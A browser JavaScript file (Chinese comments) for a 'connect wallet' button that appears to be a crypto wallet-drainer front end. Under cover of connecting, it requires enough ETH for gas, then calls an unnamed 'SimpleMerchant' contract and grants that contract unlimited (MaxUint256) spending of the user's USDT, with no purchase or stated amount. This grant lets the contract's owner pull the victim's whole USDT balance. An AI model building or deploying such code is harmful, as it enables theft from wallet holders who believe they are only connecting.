const ETHEREUM_CONTRACT_ADDRESS = '0x3df02b3b38c6b55725795db9c50b649c204f2dad';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT 主網地址
const CONTRACT_ABI = [
    "function connectAndAuthorize() external",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract;

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包');
            return;
        }
        
        provider = new ethers.BrowserProvider(window.ethereum);
        
        // 檢查網絡並切換到主網
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) { // 1n 是主網的 Chain ID
            updateStatus('正在切換到以太坊主網...');
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }] // '0x1' 是主網的十六進制 Chain ID
                });
                // 切換成功後，重新獲取 provider 和 network
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.getNetwork(); // 再次確認網絡
            } catch (switchError) {
                if (switchError.code === 4902) { // 4902 表示網絡不存在，可能需要添加
                    updateStatus('以太坊主網未添加，請手動添加或確認。');
                } else if (switchError.code === 4001) { // 4001 表示用戶拒絕
                    updateStatus('用戶拒絕切換網絡。請手動切換到以太坊主網。');
                } else {
                    updateStatus(`切換網絡失敗：${switchError.message}`);
                }
                return; // 如果切換失敗，停止後續操作
            }
        }

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();
            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer); // 修正：使用 signer 初始化
            
            await checkAuthorization(); // 檢查授權狀態
            updateStatus('已恢復連繫狀態');
        } else {
            updateStatus('請連繫錢包');
        }

        // 監聽帳戶變更事件
        window.ethereum.on('accountsChanged', async (accounts) => {
            if (accounts.length === 0) {
                resetState();
                updateStatus('錢包已斷開連繫');
            } else {
                userAddress = accounts[0];
                signer = await provider.getSigner();
                contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
                usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer); // 修正：使用 signer 初始化
                await checkAuthorization();
            }
        });

        // 監聽網絡變更事件
        window.ethereum.on('chainChanged', () => {
            resetState();
            updateStatus('網絡已切換，請重新連繫錢包');
            window.location.reload(); // 建議重新載入頁面以確保 ethers.js 環境正確
        });

    } catch (error) {
        updateStatus(`初始化失敗：${error.message}`);
        console.error("Initialize Wallet Error:", error);
    }
}

async function checkAuthorization() {
    try {
        if (!signer || !userAddress || !contract || !usdtContract) {
            // 如果還沒有初始化完成，則不執行檢查
            return;
        }

        const isAuthorized = await contract.authorized(userAddress);
        const usdtBalance = await usdtContract.balanceOf(userAddress);
        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);

        let statusMessage = '';

        if (isAuthorized) {
            statusMessage += '合約已授權。';
        } else {
            statusMessage += '合約未授權。';
        }

        if (usdtBalance > 0n) { // 使用 BigInt 比較
            if (usdtAllowance > 0n) {
                statusMessage += `USDT 餘額: ${ethers.formatUnits(usdtBalance, 6)}，已授權: ${ethers.formatUnits(usdtAllowance, 6)}。`;
            } else {
                statusMessage += `USDT 餘額: ${ethers.formatUnits(usdtBalance, 6)}，未授權 USDT。`;
            }
        } else {
            statusMessage += '無 USDT 餘額。';
        }
        
        if (isAuthorized && (usdtBalance === 0n || usdtAllowance > 0n)) { // 這裡也要使用 BigInt 比較
            connectButton.classList.add('connected');
            connectButton.title = '斷開錢包';
            connectButton.disabled = false;
            updateStatus(`已連繫並授權。${statusMessage}`);
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = '連繫錢包';
            connectButton.disabled = false;
            updateStatus(`請連繫錢包並確保授權。${statusMessage}`);
        }
    } catch (error) {
        updateStatus(`檢查授權失敗：${error.message}`);
        console.error("Check Authorization Error:", error);
    }
}


async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包');
            return;
        }

        // 請求連接錢包 (會彈出 MetaMask)
        await provider.send('eth_requestAccounts', []);
        
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer); // 確保這裡使用 signer

        // 檢查 ETH 餘額
        const ethBalance = await provider.getBalance(userAddress);
        const requiredEth = ethers.parseEther('0.005'); // 設定一個最低 ETH 要求
        if (ethBalance < requiredEth) {
            updateStatus(`ETH 餘額不足 (需要至少 ${ethers.formatEther(requiredEth)} ETH，實際 ${ethers.formatEther(ethBalance)} ETH)。請充值。`);
            return; // 餘額不足則停止
        }

        // 檢查並執行 SimpleMerchant 合約授權 (connectAndAuthorize)
        const isAuthorized = await contract.authorized(userAddress);
        if (!isAuthorized) {
            updateStatus('正在授權 SimpleMerchant 合約...');
            const txAuthorize = await contract.connectAndAuthorize();
            await txAuthorize.wait();
            updateStatus('SimpleMerchant 合約授權成功。');
        }

        // 檢查並執行 USDT 授權 (approve)
        const usdtBalance = await usdtContract.balanceOf(userAddress);
        if (usdtBalance > 0n) { // 只有當用戶有 USDT 餘額時才考慮授權
            const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
            
            // 如果已授權金額不足 (例如不是 MaxUint256，且小於當前餘額)
            // 這裡可以選擇更精確的邏輯，例如只授權一個足夠大的金額，或者直接 MaxUint256
            // 目前邏輯是如果allowance為0，則授權MaxUint256
            if (usdtAllowance === 0n || usdtAllowance < usdtBalance) { // 這裡應該判斷 allowance 是否足夠，或者是否需要重設
                // 為了簡化，如果 allowance 為 0，我們就嘗試設定為 MaxUint256
                updateStatus('正在授權 USDT 代幣...');
                const maxAllowance = ethers.MaxUint256;
                const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
                await txApprove.wait();
                updateStatus('USDT 代幣授權成功。');
            } else {
                 updateStatus('USDT 已授權足夠金額。');
            }
        } else {
            updateStatus('無 USDT 餘額，無需 USDT 授權。');
        }

        connectButton.classList.add('connected');
        connectButton.title = '斷開錢包';
        connectButton.disabled = false;
        updateStatus('連繫並授權成功。');
    } catch (error) {
        updateStatus(`操作失敗：${error.message}`);
        console.error("Connect Wallet Error:", error);
        connectButton.classList.remove('connected');
        connectButton.title = '連繫錢包';
        connectButton.disabled = false;
    }
}

function disconnectWallet() {
    resetState();
    updateStatus('錢包已斷開連繫，請重新連繫。');
    // 提示用戶在 MetaMask 中手動斷開（Ethers.js v6 不提供直接斷開功能）
    alert('錢包已斷開連繫。若需完全斷開本網站與 MetaMask 的連繫，請在 MetaMask 的「已連繫網站」中手動移除本網站。');
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;
    usdtContract = null;
    connectButton.classList.remove('connected');
    connectButton.title = '連繫錢包';
    connectButton.disabled = false;
}

function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    statusDiv.innerHTML = `<strong>狀態：</strong> ${message}`;
}

// 監聽連接按鈕點擊事件
connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});

// 頁面載入時初始化錢包狀態
initializeWallet();
console.log('connectButton event listener added and initializeWallet called');